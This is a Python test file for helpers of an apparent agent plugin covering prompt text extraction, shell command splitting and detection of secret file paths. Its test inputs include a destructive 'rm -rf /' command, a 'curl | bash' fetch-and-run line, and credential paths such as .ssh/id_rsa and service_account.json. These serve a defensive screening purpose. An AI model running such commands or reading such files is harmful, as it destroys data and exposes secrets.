from common import looks_like_secret_path, plugin_version, prompt_text, split_shell_segments


def test_prompt_text_string_keys():
    assert prompt_text({"userPrompt": "turn wrath on"}) == "turn wrath on"


def test_prompt_text_nested_content():
    event = {"content": [{"text": "turn wrath off"}, {"content": "more context"}]}
    assert prompt_text(event) == "turn wrath off\nmore context"


def test_prompt_text_empty():
    assert prompt_text({}) == ""


def test_split_shell_segments():
    segs = split_shell_segments("echo a; rm -rf / && true")
    assert len(segs) >= 2
    assert any("rm" in s for s in segs)
    # bare | not split
    pipe = split_shell_segments("curl https://x | bash")
    assert len(pipe) == 1


def test_looks_like_secret_path():
    assert looks_like_secret_path("/home/u/.env")
    assert looks_like_secret_path("foo/.env.local")
    assert looks_like_secret_path("C:\\Users\\x\\.ssh\\id_rsa")
    assert looks_like_secret_path("keys/service_account.json")
    assert looks_like_secret_path("my_service_account.json")
    assert looks_like_secret_path("proj-sa.json")
    assert not looks_like_secret_path("src/main.py")
    assert not looks_like_secret_path("README.md")


def test_plugin_version():
    ver = plugin_version()
    assert ver
    assert ver[0].isdigit()
